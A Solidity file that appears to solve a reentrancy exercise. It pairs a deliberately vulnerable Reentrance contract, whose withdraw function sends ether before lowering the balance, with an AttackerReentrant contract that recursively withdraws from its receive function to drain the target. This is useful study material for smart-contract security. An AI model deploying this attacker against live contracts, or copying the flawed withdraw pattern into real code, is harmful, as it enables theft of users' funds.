// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
}

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

interface IReentrance {
    function withdraw(uint _amount) external;

    function donate(address _to) external payable;
}

contract AttackerReentrant {
    IReentrance reentrance;

    constructor(address _reentranceAddress) public payable {
        reentrance = IReentrance(_reentranceAddress);
        reentrance.donate{value: 0.001 ether}(address(this));
    }

    function steal() public {
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        if (address(reentrance).balance >= 0.001 ether) {
            reentrance.withdraw(0.001 ether);
        }
    }
}
